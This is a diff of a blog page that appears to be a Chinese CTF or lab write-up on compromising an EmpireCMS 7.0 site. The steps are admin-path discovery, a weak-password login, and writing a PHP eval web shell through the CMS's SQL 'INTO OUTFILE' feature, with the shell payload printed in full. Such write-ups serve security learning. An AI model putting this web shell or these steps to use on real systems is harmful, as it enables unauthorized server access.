@@ -91,17 +91,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes02.PNG">
 <meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes03.PNG">
 <meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes06.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes04.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes05.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes07.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes08.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes09.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes10.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes11.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes12.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes13.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/11/23/ptes1/ptes14.PNG">
-<meta property="og:updated_time" content="2019-11-23T11:21:32.389Z">
+<meta property="og:updated_time" content="2019-11-25T03:23:09.548Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ptes1">
 <meta name="twitter:description" content="题目给出一个网站，内容太多，如何下手？">
@@ -371,43 +361,31 @@
  <a id="more"></a>
 
 <ol>
-<li>查看首页源代码，发现后台链接。</li>
+<li><p>查看首页源代码，发现后台链接。</p>
+<p> <img src="./ptes01.PNG" alt="ptes01"></p>
+</li>
+<li><p>仔细观察页面最下面，发现后台链接。</p>
+<p> <img src="./ptes02.PNG" alt="ptes02"></p>
+</li>
+<li><p>使用御剑扫描发现后台链接。</p>
+<p> <img src="./ptes03.PNG" alt="ptes03"></p>
+</li>
+<li><p>访问robots.txt文件，发现后台链接。</p>
+<p> <img src="./ptes06.PNG" alt="ptes04"></p>
+</li>
 </ol>
-<p><img src="./ptes01.PNG" alt="ptes01"></p>
-<ol start="2">
-<li>仔细观察页面最下面，发现后台链接。</li>
-</ol>
-<p><img src="./ptes02.PNG" alt="ptes02"></p>
-<ol start="3">
-<li>使用御剑扫描发现后台链接。</li>
-</ol>
-<p><img src="./ptes03.PNG" alt="ptes03"></p>
-<ol start="4">
-<li>访问robots.txt文件，发现后台链接。</li>
-</ol>
-<p><img src="./ptes06.PNG" alt="ptes04"></p>
 <p>访问后台链接页面，发现是EmpireCMS 7.0。</p>
-<p><img src="./ptes04.PNG" alt="ptes05"></p>
-<p>首先尝试弱口令test/123456顺利进入后台。</p>
+<pre><code>![ptes05](./ptes04.PNG)</code></pre><p>首先尝试弱口令test/123456顺利进入后台。</p>
 <p>浏览页面内容，当点击数据更新处时发现第一个flag。</p>
-<p><img src="./ptes05.PNG" alt="ptes06"></p>
-<p>点击版本更新，发现有《帝国网站管理系统》教程下载，</p>
-<p><img src="./ptes07.PNG" alt="ptes07"></p>
-<p>点击链接中的下载链接下载：</p>
-<p><img src="./ptes08.PNG" alt="ptes08"></p>
-<p>然后查看，发现有执行SQL语句功能。</p>
-<p><img src="./ptes09.PNG" alt="ptes09"></p>
-<p>按照里面的步骤执行SQL语句“select ‘<?php @eval($_POST[cmd])?>‘INTO OUTFILE ‘D:/www/<a href="http://www.php&#39;”。" target="_blank" rel="noopener">www.php&#39;”。</a><br>实际上本题木马已经被其他攻击者上传了。直接使用即可。</p>
-<p><img src="./ptes10.PNG" alt="ptes10"></p>
-<p>此时在服务器生成相应的含有一句话木马对php页面。</p>
-<p><img src="./ptes11.PNG" alt="ptes11"></p>
-<p>使用中国菜刀或者中国蚁剑连接该一句话木马，即可访问系统文件。</p>
-<p><img src="./ptes12.PNG" alt="ptes12"></p>
-<p>浏览C盘根目录下的user.txt文件，得到第二个flag：</p>
-<p><img src="./ptes13.PNG" alt="ptes13"></p>
-<p>同样，浏览C盘根目录下的admin.txt文件，得到第三个flag：</p>
-<p><img src="./ptes14.PNG" alt="ptes14"></p>
-
+<pre><code>![ptes06](./ptes05.PNG)</code></pre><p>点击版本更新，发现有《帝国网站管理系统》教程下载，</p>
+<pre><code>![ptes07](./ptes07.PNG)</code></pre><p>点击链接中的下载链接下载：</p>
+<pre><code>![ptes08](./ptes08.PNG)</code></pre><p>然后查看，发现有执行SQL语句功能。</p>
+<pre><code>![ptes09](./ptes09.PNG)</code></pre><p>按照里面的步骤执行SQL语句“select ‘<?php @eval($_POST[cmd])?>‘INTO OUTFILE ‘D:/www/<a href="http://www.php&#39;”。" target="_blank" rel="noopener">www.php&#39;”。</a><br>实际上本题木马已经被其他攻击者上传了。直接使用即可。</p>
+<pre><code>![ptes10](./ptes10.PNG)</code></pre><p>此时在服务器生成相应的含有一句话木马对php页面。</p>
+<pre><code>![ptes11](./ptes11.PNG)</code></pre><p>使用中国菜刀或者中国蚁剑连接该一句话木马，即可访问系统文件。</p>
+<pre><code>![ptes12](./ptes12.PNG)</code></pre><p>浏览C盘根目录下的user.txt文件，得到第二个flag：</p>
+<pre><code>![ptes13](./ptes13.PNG)</code></pre><p>同样，浏览C盘根目录下的admin.txt文件，得到第三个flag：</p>
+<pre><code>![ptes14](./ptes14.PNG)</code></pre>
       
     </div>
     
@@ -547,7 +525,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">41</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
